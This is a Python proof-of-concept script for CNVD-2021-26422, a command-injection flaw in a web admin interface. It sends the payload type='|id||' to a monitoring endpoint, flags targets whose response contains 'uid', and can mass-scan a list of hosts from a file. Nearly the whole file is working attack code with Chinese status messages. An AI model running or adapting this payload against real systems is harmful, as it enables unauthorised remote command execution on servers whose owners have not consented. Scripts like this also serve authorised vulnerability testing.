#!/usr/bin/env python
# -*- conding:utf-8 -*-

import requests
import argparse
import json
import urllib3
import sys
urllib3.disable_warnings()

class information(object):
    def __init__(self, args):
        self.args = args
        self.url = args.url
        self.file = args.file

    def target_url(self):
        target_url = self.url + "/webadm/?q=moni_detail.do&action=gragh"
        headers = {
            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:87.0) Gecko/20100101 Firefox/87.0",
            "Content-Type": "application/x-www-form-urlencoded"
        }


        data = r"type='|id||'"

        try:
            res = requests.post(url=target_url, data=data, headers=headers, verify=False, timeout=5)
            if "uid" in res.text and res.status_code == 200:
                print(f"\033[31m[!]  目标系统: {self.url} 存在命令执行漏洞！\033[0m")
            else:
                print(f"[!]  目标系统: {self.url} 不存在命令执行漏洞！")
        except Exception as e:
            print(f"[-]  站点连接错误！")

    def file_url(self):
        with open(self.file, "r") as urls:
            for url in urls:
                url = url.strip() # 去除两边空格
                if url[:4] != "http":
                    url = "http://" + url
                self.url = url.strip()
                information.target_url(self)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="CNVD-2021-26422 Options")
    parser.add_argument("-u", "--url", type=str, metavar="url", help="Target url eg:\"http://127.0.0.1\"")
    parser.add_argument("-f", "--file", metavar="file", help="Targets in file  eg:\"ip.txt\"")
    args = parser.parse_args()
    if len(sys.argv) != 3:
        print("[-]  参数错误！\neg1:>>>python3 CNVD-2021-26422.py -u http://127.0.0.1\neg2:>>>python3 CNVD-2021-26422.py -f ip.txt")
    elif args.url:
        information(args).target_url()
    elif args.file:
        information(args).file_url()